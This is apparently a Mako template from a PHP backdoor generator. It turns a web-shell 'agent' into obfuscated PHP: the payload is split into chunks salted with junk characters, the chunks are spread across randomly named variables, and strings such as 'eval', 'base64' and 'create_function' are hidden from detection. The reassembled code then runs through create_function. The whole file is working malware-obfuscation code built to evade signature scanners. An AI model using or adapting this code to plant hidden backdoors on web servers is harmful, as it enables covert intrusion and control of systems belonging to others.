<?php<%!
import random
import itertools
import string
import re
import shlex 
import utils
%><%

# Does not include \ to avoid escaping termination quotes
def find_substr_not_in_str(mainstr, characters = string.ascii_letters + string.digits + '!"#$%&()*+,-./:;<=>?@[]^_`{|}~'):
	while True:
		substr = utils.strings.randstr(2, False, characters)
		if not substr in mainstr:
			return substr

def obfuscate(payload, obf, division, dangerous):
	while True:

		polluted = obf.join(list(utils.strings.divide(payload, 0, division, len(payload)//division)))

		found = False
		for dang in dangerous:
			if dang in polluted:
				found = True

		if not found:
			return polluted

# Try to minify
agent_minified = re.sub(rb'[\n\r\t]',b'',agent)

obfuscation_agent = find_substr_not_in_str(agent_minified)
obfuscated_agent = obfuscate(agent_minified, obfuscation_agent, 6, (b'eval', b'base64', b'gzuncompress', b'gzcompress'))

agent_splitted_line_number = random.randint(5,8)

agent_splitted = list(utils.strings.divide(obfuscated_agent, len(obfuscated_agent)//agent_splitted_line_number-random.randint(0,5), len(obfuscated_agent)//agent_splitted_line_number, agent_splitted_line_number))

agent_variables = list(string.ascii_letters[:])
random.shuffle(agent_variables)
agent_variables_references = agent_variables[:]

# TODO: if a / is just before the endin quote, it will be uncorrectly escaped.
# Fix this (wrap data between " and use json.dump?)

agent_list = []
for line in agent_splitted:
	# Lines are quoted now and not before (could separate escape and quote on splitting)

        line = shlex.quote(line.decode('utf-8'))

	# Replace all the \ with \\, to avoid to escape the trailing quote.
	line = re.sub('\\\\','\\\\\\\\', line)

	agent_list.append((agent_variables.pop(0), '%s;' % line))

obfuscation_createfunc = find_substr_not_in_str(b'create_function', string.ascii_letters)
obfuscated_createfunc = obfuscate(b'create_function', obfuscation_createfunc, 2, ())

agent_list.append((agent_variables.pop(0), "str_replace('%s','','%s');" % (obfuscation_createfunc.decode('utf-8'), obfuscated_createfunc.decode('utf-8'))))

random.shuffle(agent_list)
%>
% for line in agent_list:
$${line[0]}=${line[1]}
% endfor
$${agent_variables.pop(0)}=str_replace('${obfuscation_agent.decode('utf-8')}','',$${'.$'.join(agent_variables_references[:agent_splitted_line_number])});
$${agent_variables.pop(0)}=$${agent_variables_references[agent_splitted_line_number]}('',$${agent_variables_references[agent_splitted_line_number+1]});$${agent_variables_references[agent_splitted_line_number+2]}();
?>
